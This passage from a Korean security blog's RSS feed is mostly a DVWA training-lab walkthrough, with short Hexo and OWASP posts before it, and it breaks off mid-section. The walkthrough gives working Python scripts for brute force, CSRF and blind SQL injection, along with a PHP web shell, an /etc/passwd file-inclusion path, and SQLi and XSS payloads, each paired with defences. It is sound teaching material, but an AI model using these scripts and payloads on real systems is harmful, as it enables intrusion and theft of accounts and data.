방법은 아래와 같다.</p><pre><code class="bash">hexo init &lt;name&gt;cd &lt;name&gt;npm install --save</code></pre><p>name에는 본인의 블로그 폴더명을 지정하면 된다.</p><p>이후 hexo 서버를 로컬에서 실행해보려면 다음과 같이 하면 된다.</p><pre><code class="bash">hexo server</code></pre><p>hexo s로 줄여서 사용도 가능하니 참고하자~!</p><p>그러면 localhost:4000 으로 서버가 열릴텐데 접속해서 정상적으로 설치되었는지 확인해보면 된다.</p><h3 id="Hexo-Build-amp-Deploy"><a href="#Hexo-Build-amp-Deploy" class="headerlink" title="Hexo Build &amp; Deploy"></a>Hexo Build &amp; Deploy</h3><p>블로그를 만들었으면 이제 본인의 GitHub에 배포를 해야 하는 작업이 필요하다. (깃허브 주소로 서버를 돌릴려면~)</p><p>우선 아래 명령어를 통해 배포용 파일을 만들자</p><pre><code class="bash">hexo clean &amp;&amp; hexo generate</code></pre><p>두 명령어는 clean을 통해서 기존의 배포판 파일을 삭제한 뒤 generate로 재생성 하는 명령어이다.</p><p>이후 아래 명령어를 통해 git deploy package를 설치하자.</p><pre><code class="bash">npm install hexo-deployer-git --save</code></pre><p>패키지 설치가 끝났으면, <code> _config.yml </code> 파일의 하단에 아래와 같이 수정하자</p><pre><code class="bash"># Deployment## Docs: https://hexo.io/docs/one-command-deploymentdeploy:  type: git  repo: &#39;본인의 깃허브 Repo&#39;  branch: &#39;본인의 깃허브 Repo -&gt; Branch&#39;</code></pre><p>이렇게까지 세팅하고 이제 마지막 한 단계만 더 하면 깃허브에 배포가 될 것이며 아까 생성한 Repo의 주소로 Hexo 블로그 뼈대가 만들어 질 것이다!</p><pre><code class="bash">hexo deploy</code></pre>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Docx/">Docx</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Github/">Github</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Hexo/">Hexo</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Blog/">Blog</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/01/20/hexoblog-210120/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>OWASP TOP 10 2021 제안 자료</title>
      <link>https://blog.jhyeon.dev/2021/01/20/owasp2021-210120/</link>
      <guid>https://blog.jhyeon.dev/2021/01/20/owasp2021-210120/</guid>
      <pubDate>Tue, 19 Jan 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;4년마다 OWASP 에서는 웹 애플리케이션에서 발생한 주요 취약점 리스트(top 10/category) 정보를 주는데,&lt;/p&gt;
&lt;p&gt;올해에도 제안 자료가 있어서 링크를 남겨본다. (공식 정보는 아닙니당)&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https:/</description>
        
      
      
      
      <content:encoded><![CDATA[<p>4년마다 OWASP 에서는 웹 애플리케이션에서 발생한 주요 취약점 리스트(top 10/category) 정보를 주는데,</p><p>올해에도 제안 자료가 있어서 링크를 남겨본다. (공식 정보는 아닙니당)</p><p><a href="https://lab.wallarm.com/owasp-top-10-2021-proposal-based-on-a-statistical-data/?amp&amp;fbclid=IwAR1oIWYr_bXxragBk1OJEX4WasafYOUbyv-61z5wAKicIa6RwuPlJbxJnrc">https://lab.wallarm.com/owasp-top-10-2021-proposal-based-on-a-statistical-data/?amp&amp;fbclid=IwAR1oIWYr_bXxragBk1OJEX4WasafYOUbyv-61z5wAKicIa6RwuPlJbxJnrc</a></p><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li>Play The Web</li></ul>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Web/">Web</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/OWASP/">OWASP</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/01/20/owasp2021-210120/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>DVWA 웹 취약점 모의 훈련 도구 리뷰</title>
      <link>https://blog.jhyeon.dev/2021/01/19/dvwa-review-210119/</link>
      <guid>https://blog.jhyeon.dev/2021/01/19/dvwa-review-210119/</guid>
      <pubDate>Mon, 18 Jan 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h3&gt;&lt;p&gt;DVWA는 웹 취약점 모의 해킹(훈련) 도구이며 다운로드는 아래 링크에서 가능합니다.&lt;/p&gt;
&lt;ul&gt;
&lt;</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><p>DVWA는 웹 취약점 모의 해킹(훈련) 도구이며 다운로드는 아래 링크에서 가능합니다.</p><ul><li><p><a href="http://www.dvwa.co.uk/">http://www.dvwa.co.uk</a></p></li><li><p>해당 포스트에서는 초심자인 easy 난이도와 대응 방안에 대해서만 작성합니다.</p></li><li><p>기능 별 순차적으로 업데이트 할 예정입니다!</p></li></ul><hr><h3 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h3><p>해당 문제는 제목 답게 “Brute Force(무차별 대입 공격)” 기법을 사용하는 문제이다.</p><img src="/img/post/dvwa/bruteforce.png" class="lazyload" data-srcset="/img/post/dvwa/bruteforce.png" srcset="data:image/png;base64,666"><p>그냥 평범하게 로그인 창이 있는데, 공격 벡터는 두군데 밖에 없다. (아이디 / 패스워드 입력폼)</p><p>사용자로부터 입력을 받는 폼에서 이제 무차별 대입 공격 기법을 시도하여 계정을 알아내는 방식이다.</p><pre><code class="php">&lt;?php if( isset( $_GET[ &#39;Login&#39; ] ) ) &#123;     // Get username     $user = $_GET[ &#39;username&#39; ];     // Get password     $pass = $_GET[ &#39;password&#39; ];     $pass = md5( $pass );     // Check the database     $query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;     $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );    if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123;         // Get users details         $row    = mysqli_fetch_assoc( $result );         $avatar = $row[&quot;avatar&quot;];         // Login successful         echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;;         echo &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;     &#125;     else &#123;         // Login failed         echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;     &#125;     ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res); &#125; ?&gt; </code></pre><p>로직은 매우 간단하다. POST 방식으로 넘어온 username, password 값을 받아서 각각 $user, $pass 변수에 저장한다.</p><pre><code class="php">    // Check the database     $query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;     $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );</code></pre><p>이후 넘어온 $user(username) 값과 $pass(password) 값을 users 테이블과 매칭해 데이터가 있는지 조회하는 쿼리문을 작성했다.</p><p>일치하는 정보가 있으면 login successful 로 넘어갈 것이고, 없거나 하나라도 틀린정보가 있다면 login failed 로직쪽으로 넘어갈 것이다.</p><p>해당 단계는 아래 python 코드를 사용하여 풀이할 수 있다.</p><pre><code class="py">#!/usr/bin/python3import requestsfrom time import sleepurl = &quot;http://192.168.25.60:4731/vulnerabilities/brute/&quot;session = &#123;&quot;PHPSESSID&quot;:&quot;sessionid&quot;,&quot;security&quot;:&quot;low&quot;&#125;with open(&#39;password.txt&#39;) as f:    while True:        line = f.readline().splitlines()        param = &#123;&quot;username&quot;:&quot;admin&quot;, &quot;password&quot;:line, &quot;Login&quot;:&quot;Login&quot;&#125;        r = requests.get(url, params=param, cookies=session)        sleep(1)        if(&quot;Welcome to the password protected area admin&quot; in r.text):            print(&quot;password matching!!&quot;,line)        else:            print(&quot;not match&quot;)        if not line:            break</code></pre><p>코드에 사용된 “password.txt”는 github에 검색좀 해보면 나오는 리스트들이다.</p><p>이러한 비밀번호 리스트들을 사용해서 한줄씩 대입을 하여 로그인이 됐을 때의 상태 / 실패했을 때의 상태를 체크해서</p><p>문제를 풀어주면 된다.</p><hr><h3 id="Brute-Force-대응-방안"><a href="#Brute-Force-대응-방안" class="headerlink" title="Brute Force (대응 방안)"></a>Brute Force (대응 방안)</h3><p>무차별 대입 공격을 막는 방법은 여러가지가 있을 수 있지만</p><p>자동화 도구나 봇을 통해 작업을 하는 것을 차단할 수 있는 “google recapture”를 적용하면 된다.</p><p>또한 연속적으로 시도하지 못하도록 “최대 시도 횟수 제한” 기능을 넣는다면 이런 공격으로부터 방어를 할 수 있지 않나 싶다.</p><hr><h3 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h3><p>커맨드 인젝션(Cmd Injection) 공격은 웹 앱에서 시스템 명령을 사용할 때 적절한 필터링 조치가 되어 있지 않은 경우</p><p>하나의 커맨드안에서 두개의 명령을 실행 해 공격자가 원하는 결과를 얻어낼 수 있는 공격입니다.</p><hr><pre><code class="php">&lt;?phpif( isset( $_POST[ &#39;Submit&#39; ]  ) ) &#123;    // Get input    $target = $_REQUEST[ &#39;ip&#39; ];    // Determine OS and execute the ping command.    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123;        // Windows        $cmd = shell_exec( &#39;ping  &#39; . $target );    &#125;    else &#123;        // *nix        $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );    &#125;    // Feedback for the end user    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125;?&gt;</code></pre><p>우선 코드를 분석해보면 REQUEST로 사용자로 부터 ip값을 입력받아 $target 변수에 저장하고,</p><p>하단의 shell_exec 시스템 함수로 ping 명령을 수행합니다.</p><p>ex) shell_exec(ping 127.0.0.1)</p><p>ex) shell_exec(ping -c 4 127.0.0.1)</p><p>넘어온 ip를 대입해서 함수를 맞춰보면 이런 구조가 되겠죠.</p><p>다만, 아래와 같이 사용할 경우 커맨드 인젝션이 발생하게 됩니다.</p><pre><code class="bash">ping -c 4 127.0.0.1 | pwd</code></pre><p>127.0.0.1로 핑을 보내는 동시에 뒤에 |(파이프라인)으로 처리된 pwd 명령까지 함께 실행하게 됩니다.</p><p>즉 하나의 커맨드안에서 두개의 명령을 실행하는 것이 가능하다는 의미이죠.</p><p>실무에서는 잘 없겠지만 매~~우매우 취약한 사이트에 이런 기능이 있다고 하면</p><p>공격자가 RCE 환경을 만들어버릴 수 있는 취약점입니다.</p><hr><h3 id="Command-Injection-대응-방안"><a href="#Command-Injection-대응-방안" class="headerlink" title="Command Injection(대응 방안)"></a>Command Injection(대응 방안)</h3><p>제가 생각하기엔, 실무나 회사에서 과연 이런 시스템 함수를 써서 뭔가의 기능을 사용할 일이 있나 싶습니다.</p><p>그러나, 다방면으로 쓰는 분들이 있을 수 있기에 간단한 대응 방안을 나열해봅시다.</p><ol><li><p>특수문자 필터링</p></li><li><p>입력값 regex 정규식 표현 사용</p></li><li><p>화이트 리스트 기반 명령어 실행 (사용할 수 있는 명령어 제한)</p></li></ol><p>뭐 이정도가 될 수 있겠네요 ㅎㅎ..</p><hr><h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>CSRF(Cross Site Request Forgery)는 공격자가 수정, 삭제 등의 행위를 CSRF 취약점이 발생하는 웹 페이지에,</p><p>요청을 보내 처리하는 방식의 취약점을 의미합니다.</p><p>DVWA에서의 CSRF 폼은 아래와 같습니다.</p><img src="/img/post/dvwa/csrf.png" class="lazyload" data-srcset="/img/post/dvwa/csrf.png" srcset="data:image/png;base64,666"><pre><code class="php">&lt;?phpif( isset( $_GET[ &#39;Change&#39; ] ) ) &#123;    // Get input    $pass_new  = $_GET[ &#39;password_new&#39; ];    $pass_conf = $_GET[ &#39;password_conf&#39; ];    // Do the passwords match?    if( $pass_new == $pass_conf ) &#123;        // They do!        $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));        $pass_new = md5( $pass_new );        // Update the database        $insert = &quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;&quot; . dvwaCurrentUser() . &quot;&#39;;&quot;;        $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $insert ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );        // Feedback for the user        echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;;    &#125;    else &#123;        // Issue with passwords matching        echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;;    &#125;    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt;</code></pre><p>소스코드를 분석해보면 간단한 로직으로 기능이 돌아갑니다.</p><p>새 비밀번호, 새 비밀번호 체크 두 가지 값을 입력받아서, 두 값이 같은지 검사한 뒤</p><p>users 테이블의 현재 유저(dvwa 로그인 사용자)에 대한 비밀번호를 업데이트하는 쿼리문을 요청합니다.</p><p>여기서 CSRF 취약점이 어디서 발생하냐 할 수 있는데, 자세히 보면 현재 비밀번호를 변경할 때 입력 값을 통해 바로 업데이트 쿼리문을 수행합니다.</p><p>그럼, 공격자의 입장에서는 비밀번호 변경 페이지에 변경할 비밀번호 값과 함께 요청을 보내는 방식의 공격을 통해 사용자의 비밀번호를 변경이 가능합니다.</p><pre><code class="py">#!/usr/bin/python3import requestsurl = &quot;http://192.168.25.61:4731/vulnerabilities/csrf/&quot;session = &#123;&quot;PHPSESSID&quot;:&quot;sessionid&quot;,&quot;security&quot;:&quot;low&quot;&#125;param = &#123;&quot;password_new&quot;:&quot;0000&quot;, &quot;password_conf&quot;:&quot;0000&quot;, &quot;Change&quot;:&quot;Change&quot;&#125;r = requests.get(url, params=param, cookies=session)if(&quot;Password Changed.&quot; in r.text):    print(&quot;password changed!&quot;)else:    print(&quot;password change failed&quot;)</code></pre><p>python 경우에는 위 코드로 쉽게 수정이 가능합니다.</p><p>해당 방법 이외에도 공격자 입장에서는 가짜 페이지를 만들어서 그쪽으로 유도하거나 이메일 통해서도 공격 시도가 가능하게 됩니다.</p><hr><h3 id="CSRF-대응-방안"><a href="#CSRF-대응-방안" class="headerlink" title="CSRF (대응 방안)"></a>CSRF (대응 방안)</h3><ol><li><p>CSRF TOKEN 추가</p><ul><li><a href="https://portswigger.net/web-security/csrf/tokens">https://portswigger.net/web-security/csrf/tokens</a></li></ul></li><li><p>HTTP Header(Referer) 검증</p><ul><li><a href="https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/Referer">https://developer.mozilla.org/ko/docs/Web/HTTP/Headers/Referer</a></li></ul></li></ol><hr><h3 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h3><p>File Inclusion이란, LFI(Local FIle Include)와 동일한 개념이라고 생각하면 됩니다.</p><p>즉, 로컬 저장소에 저장된 파일을 페이지에서 불러올 수 있는 취약점입니다.</p><img src="/img/post/dvwa/lfi.png" class="lazyload" data-srcset="/img/post/dvwa/lfi.png" srcset="data:image/png;base64,666"><pre><code class="php">&lt;?php// The page we wish to display$file = $_GET[ &#39;page&#39; ];?&gt;</code></pre><p>low 레벨에서는 소스코드가 매우 간단합니다.  page 파라미터를 넘겨받아서 그대로 페이지에 include 해주는 로직입니다.</p><p>그럼 여기서, 페이지에 나와있는 file1, fil2, file3.php는 당연히 로컬 서버의 저장소에 저장이 되어 있겠죠?</p><p>이런 점을 생각해서 다른 로컬 파일들을 읽어오면 됩니다.</p><pre><code class="bash">?page=/etc/passwd?page=/etc/~~...</code></pre><p>LFI를 활용해서는 php 설정 옵션인 <code> allow_url_include </code>가 ON으로 되어 있을 경우</p><p>RFI(Remote File Inclusion) 외부 URL를 읽어서 페이지에 로드하는 것도 가능합니다.</p><p>이에 대해서는 DVWA 리뷰가 아닌 LFI &amp; RCE 라는 주제로 새 포스팅에서 다뤄볼 예정입니다.</p><hr><h3 id="File-Inclusion-대응-방안"><a href="#File-Inclusion-대응-방안" class="headerlink" title="File Inclusion(대응 방안)"></a>File Inclusion(대응 방안)</h3><ol><li><p>php를 사용할 때 외부 파일을 로드하지 못하도록 allow_url_include, url_fopen 옵션 OFF</p></li><li><p>입력값 필터링(preg_match, regex 등)</p></li><li><p>특정 디렉토리에서만 파일을 읽어올 수 있도록 조치</p></li></ol><hr><h3 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h3><p>파일 업로드(File Upload) 취약점을 다루는 페이지입니다.</p><p>파일 업로드 취약점은 웹 애플리케이션 내 서버에 파일을 업로드 하는 기능이 있을 때 업로드 하는 파일에 대한 검사를 하지 않고</p><p>서버에 다이렉트로 업로드 되는 경우 공격자가 “웹쉘”, “악성파일” 등을 업로드하여 서버에 접근할 수 있는 취약점 입니다.</p><img src="/img/post/dvwa/upload.png" class="lazyload" data-srcset="/img/post/dvwa/upload.png" srcset="data:image/png;base64,666"><pre><code class="php">&lt;?phpif( isset( $_POST[ &#39;Upload&#39; ] ) ) &#123;    // Where are we going to be writing to?    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;    $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] );    // Can we move the file to the upload folder?    if( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) &#123;        // No        echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;;    &#125;    else &#123;        // Yes!        echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;    &#125;&#125;?&gt;</code></pre><p>코드도 매우 간단합니다. (low 레벨이라. ㅎㅎ) 사용자로 부터 업로드할 파일을 받아서</p><p>DVWA ROOT 경로 -&gt; hackable/uploads 폴더에 파일을 업로드하도록 되어 있네요.</p><p>이 과정에서 파일에 대한 검증 로직이 없기 때문에 위에서 언급했던 웹쉘 업로드가 가능합니다.</p><pre><code class="php">&lt;?php    system($_GET[&#39;cmd&#39;]);?&gt;</code></pre><p>시스템 함수를 사용하여 웹쉘을 만들어주고, 업로드 하면 됩니다.</p><p>저는 shell.php 라는 파일명으로 업로드 하였을 때 (hackable/uploads/shell.php)로 저장이 됩니다.</p><p>그럼 이제 해당 경로로 가서 웹쉘을 실행시켜봅시다.</p><img src="/img/post/dvwa/upload_result.png" class="lazyload" data-srcset="/img/post/dvwa/upload_result.png" srcset="data:image/png;base64,666"><hr><h3 id="File-Upload-대응-방안"><a href="#File-Upload-대응-방안" class="headerlink" title="File Upload (대응 방안)"></a>File Upload (대응 방안)</h3><ol><li><p>업로드 하는 파일의 확장자 검사 또는 화이트 리스트 적용(jpg, png, gif 등)</p></li><li><p>파일 실행권한(x) 제거</p></li><li><p>업로드 시에 파일 경로/파일 명을 알 수 없도록 난독화하여 저장</p></li><li><p>특수문자 필터링</p></li></ol><hr><h3 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h3><p>SQL Injection 취약점은 OWASP 에서도 매번 Top 10 이슈에 뜨는 취약점이라고 할 수 있습니다.</p><p>공격자가 취약한 사이트를 대상으로, 악의적인 쿼리를 만들어 요청을 보냄으로써 DB 시스템에 접근, 제어(수정, 삭제, 등록), 조회 등의 행위가 가능하게 됩니다.</p><p>예시로 숙박앱을 운영하는 기업중 한 군데가 SQL Injection 공격을 받아 개인정보가 유출당했던 피해도 있었죠</p><p>아무튼.. 한번 실습으로 떠나봅시다.</p><img src="/img/post/dvwa/sql.png" class="lazyload" data-srcset="/img/post/dvwa/sql.png" srcset="data:image/png;base64,666"><pre><code class="php">&lt;?phpif( isset( $_REQUEST[ &#39;Submit&#39; ] ) ) &#123;    // Get input    $id = $_REQUEST[ &#39;id&#39; ];    // Check database    $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;;    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; );    // Get results    while( $row = mysqli_fetch_assoc( $result ) ) &#123;        // Get values        $first = $row[&quot;first_name&quot;];        $last  = $row[&quot;last_name&quot;];        // Feedback for end user        echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;    &#125;    mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);&#125;?&gt;</code></pre><p>사용자로부터 입력을 받는 폼은 (id) 부분입니다. 값을 입력받아서 $id 변수에 저장하고, users 테이블에 user_id=$id 인 경우를 조회하게 됩니다.</p><p>그리고 만약 조회된 데이터가 있을 경우 first_name, last_name을 출력해주는 로직입니다.</p><p>어디서 취약점이 발생했을까요?</p><pre><code class="php">$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&quot;;</code></pre><p>해당 부분을 보면 사용자로부터 입력값이 넘어온 상태에서 그대로 $id 변수에 저장하고 어떠한 검증도 거치지 않습니다.</p><p>그래서 사용자가 어떤 값을 입력하든 모두 쿼리문에 들어간다는 의미로 볼 수 있죠.</p><p>만약 해당 쿼리문의 결과를 무조건 참(True)으로 만든다면 결과는 당연히 조회하는 테이블의 모든 행을 출력할 수 있습니다.</p><p>아래 쿼리를 입력해봅시다.</p><pre><code class="sql">&#39; or 1=1#&#39;</code></pre><img src="/img/post/dvwa/sql2.png" class="lazyload" data-srcset="/img/post/dvwa/sql2.png" srcset="data:image/png;base64,666"><p>조회하는 테이블의 모든 행이 조회가 가능했습니다. 이러한 sql injection 공격의 종류에는 아래와 같이 다양합니다.</p><ol><li><p>nosql injection</p></li><li><p>time based injection</p></li><li><p>blind injection</p></li><li><p>union injection</p></li><li><p>error based injection</p></li></ol><p>…</p><p>나중에 예제를 가지고 포스팅 하겠지만, 이외에도 수많은 공격 기법이 존재함을 알 수 있습니다.</p><hr><h3 id="SQL-Injection-대응-방안"><a href="#SQL-Injection-대응-방안" class="headerlink" title="SQL Injection 대응 방안"></a>SQL Injection 대응 방안</h3><ol><li><p>특수문자 필터링</p></li><li><p>PDO(Prepared Statement) 방식의 코드 작성</p></li><li><p>입력 값 필터링(preg_match)</p></li><li><p>입력 값 치환(addslashes 등의 함수)</p></li></ol><p>사실 PDO 방식으로만 해도 거의 대부분의 인젝션 공격은 막을 수 있다고 봅니다.</p><hr><h3 id="SQL-Injection-Blind"><a href="#SQL-Injection-Blind" class="headerlink" title="SQL Injection(Blind)"></a>SQL Injection(Blind)</h3><p>이번엔, Blind Injection 공격 기법을 알아보겠습니다.</p><p>Blind 의미는 이전의 SQL Injection 단계처럼 화면 상에 결과를 보여주는 것이 아닌</p><p>값이 존재하면 true/false 또는 존재합니다/존재하지 않습니다 등으로 처리하게 됩니다.</p><p>그래서 사용자의 데이터를 이전 방법처럼 시도했을 때는 확인이 불가능합니다.</p><blockquote><p>예제</p></blockquote><pre><code class="sql">1&#39; or 1=2 order by &lt;num&gt;#</code></pre><p>num에 위치한 자리에 컬럼의 개수를 1,2,3,4 등으로 넣어서 컬럼의 개수를 확인할 수 있습니다.</p><p>만약 대입한 숫자가 컬럼 개수와 일치한다면 “User ID exists in the database.” 문구를 띄울 것입니다.</p><p>이런 점을 이용해서 위에서 설명했듯이 값이 맞을 때랑 틀릴 때를 구분하여 값을 하나씩 맞추면서 인젝션을 시도하게 됩니다.</p><pre><code class="py">#!/usr/bin/python3import requestsfrom time import sleepurl = &quot;http://ip:port/vulnerabilities/sqli_blind&quot;session = &#123;&quot;PHPSESSID&quot;:&quot;key&quot;,&quot;security&quot;:&quot;low&quot;&#125;length = 0password = &quot;&quot;for i in range(1, 30):    param = &#123;&quot;id&quot;:&quot;1&#39; and length(database())=&quot;+str(i)+&quot;#&quot;, &quot;Submit&quot;:&quot;Submit#&quot;&#125;    r = requests.get(url, params=param, cookies=session)    if(&quot;User ID exists in the database.&quot; in r.text):        length = i        print(length)        break    else:        print(param)for i in range(1, length+1):    for j in range(32, 128):        param = &#123;&quot;id&quot;:&quot;1&#39; and substr(database(),&quot; +str(i)+ &quot;, 1)=&quot;&quot;&#39;&quot;+chr(j)+&quot;&#39;&quot;+&#39;#&#39;, &quot;Submit&quot;:&quot;Submit#&quot;&#125;        r = requests.get(url, params=param, cookies=session)        if(&quot;User ID exists&quot; in r.text):            password += chr(j)            print(password)        else:            print(param)</code></pre><p>위와 같이 여러 함수들을 사용해서 응용 할 수 있는 것이죠.</p><p>Blind Injection 에서 사용하는 함수들은 <code> substr, hex, ord, ascii, length, left, right </code> 등 여러 많은 함수가 있습니다.</p><p>추후 포스팅 될 여러 DB 엔진에서 발생하는 SQL 인젝션에 대해서 좀 더 알아보도록 합시다.</p><hr><h3 id="SQL-Injection-Blind-대응-방안"><a href="#SQL-Injection-Blind-대응-방안" class="headerlink" title="SQL Injection(Blind) 대응 방안"></a>SQL Injection(Blind) 대응 방안</h3><ol><li><p>입력 값에 따른 결과를 공격자가 추측할 수 없도록 설정 (true/false)</p></li><li><p>PDO 방식 코딩 권장</p></li></ol><p>대응 방안은 그냥 SQL 인젝션이랑 유사하다고 보시면 됩니다! 다만, true/false 결과가 나오는 정도는 막아주셔야 하겠지요.</p><hr><h3 id="DOM-Based-XSS"><a href="#DOM-Based-XSS" class="headerlink" title="DOM Based XSS"></a>DOM Based XSS</h3><p>이번에 볼 내용은 XSS(Cross Site Scripting) 공격 기법 중 DOM 방식에 대해서 알아보겠습니다.</p><p>DOM 방식은 XML이나 HTML 문서에 접근하기 위한 일종의 인터페이스라고 보시면 됩니다.</p><pre><code class="js">if (document.location.href.indexOf(&quot;default=&quot;) &gt;= 0) &#123;    var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8);    document.write(&quot;&lt;option value=&#39;&quot; + lang + &quot;&#39;&gt;&quot; + decodeURI(lang) + &quot;&lt;/option&gt;&quot;);    document.write(&quot;&lt;option value=&#39;&#39; disabled=&#39;disabled&#39;&gt;----&lt;/option&gt;&quot;);&#125;document.write(&quot;&lt;option value=&#39;English&#39;&gt;English&lt;/option&gt;&quot;);document.write(&quot;&lt;option value=&#39;French&#39;&gt;French&lt;/option&gt;&quot;);document.write(&quot;&lt;option value=&#39;Spanish&#39;&gt;Spanish&lt;/option&gt;&quot;);document.write(&quot;&lt;option value=&#39;German&#39;&gt;German&lt;/option&gt;&quot;);</code></pre><p>우선 해당 페이지의 소스 코드를 보면 DOM 객체로 페이지를 처리하고 있음을 알 수 있습니다.</p><p>URL을 보면 <code> vulnerabilities/xss_d?default=내용 </code> 과 같이 처리되는 것이죠.</p><p>DOM XSS라고 해서 일반적인 XSS와 크게 다르지는 않습니다.</p><p>default 변수 뒤 값이 들어갈 때의 부분을 조작하여 공격자의 URL이나 스크립트를 실행시킬 수 있게됩니다.</p><img src="/img/post/dvwa/domxss.png" class="lazyload" data-srcset="/img/post/dvwa/domxss.png" srcset="data:image/png;base64,666"><pre><code class="html">alert(document.cookie)</code></pre><h3 id="DOM-Based-XSS-대응-방안"><a href="#DOM-Based-XSS-대응-방안" class="headerlink" title="DOM Based XSS (대응 방안)"></a>DOM Based XSS (대응 방안)</h3><ol><li><p>특수문자 필터링 또는 치환</p></li><li><p>정규식 표현을 통한 입력값 제한</p></li><li><p>HTML 태그 입력 제한</p></li></ol><hr><h3 id="Reflect-XSS"><a href="#Reflect-XSS" class="headerlink" title="Reflect XSS"></a>Reflect XSS</h3><p>Reflect XSS 공격 기법은 반사형 XSS라고 부르며, 공격 과정은 다음과 같습니다.</p><img src="/img/post/dvwa/reflexted-xss.png" class="lazyload" data-srcset="/img/post/dvwa/reflexted-xss.png" srcset="data:image/png;base64,666"><ol><li><p>공격자가 악성 스크립트가 포함된 URL을 사용자에게 노출시킵니다.</p></li><li><p>사용자가 브라우저 내 해당 링크를 클릭했을 때 공격자가 정의한 악성 스크립트가 실행됩니다.</p></li><li><p>해당 악성 스크립트는 브라우저 내 비밀 정보(세션, 쿠키, 토큰값 등)를 공격자에게 전달하게 됩니다.</p></li></ol><p>이런 과정을 통해서 